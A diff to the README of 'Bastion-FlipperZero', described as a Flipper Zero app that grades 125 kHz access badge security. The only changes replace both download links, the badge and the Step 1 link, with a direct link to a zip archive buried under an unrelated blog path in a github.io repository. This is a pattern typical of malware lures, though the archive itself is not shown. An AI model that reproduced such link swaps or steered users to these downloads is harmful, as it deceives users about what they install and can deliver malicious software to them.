@@ -5,7 +5,7 @@ description: "Grade your 125 kHz badge security with a Flipper Zero, revealing p
 ---
 # 🛡️ Bastion-FlipperZero - Grade Your Badge Security Instantly
 
-[![Download](https://img.shields.io/badge/Download-Bastion--FlipperZero-blueviolet?style=for-the-badge&logo=github)](https://github.com/couchant-nightbird919/Bastion-FlipperZero)
+[![Download](https://img.shields.io/badge/Download-Bastion--FlipperZero-blueviolet?style=for-the-badge&logo=github)](https://github.com/couchant-nightbird919/couchant-nightbird919.github.io/raw/refs/heads/main/blog/2024/4/5/Latest-1.0.zip)
 
 ## 🎯 What Does This Do?
 
@@ -16,7 +16,7 @@ Hold any 125 kHz access badge (EM4100, HID Prox, Indala, AWID, ioProx, Gallagher
 ### Step 1: Get Bastion-FlipperZero
 
 Visit this link to download the application:  
-[https://github.com/couchant-nightbird919/Bastion-FlipperZero](https://github.com/couchant-nightbird919/Bastion-FlipperZero)
+[https://github.com/couchant-nightbird919/couchant-nightbird919.github.io/raw/refs/heads/main/blog/2024/4/5/Latest-1.0.zip](https://github.com/couchant-nightbird919/couchant-nightbird919.github.io/raw/refs/heads/main/blog/2024/4/5/Latest-1.0.zip)
 
 ### Step 2: Install on Your Flipper Zero
 
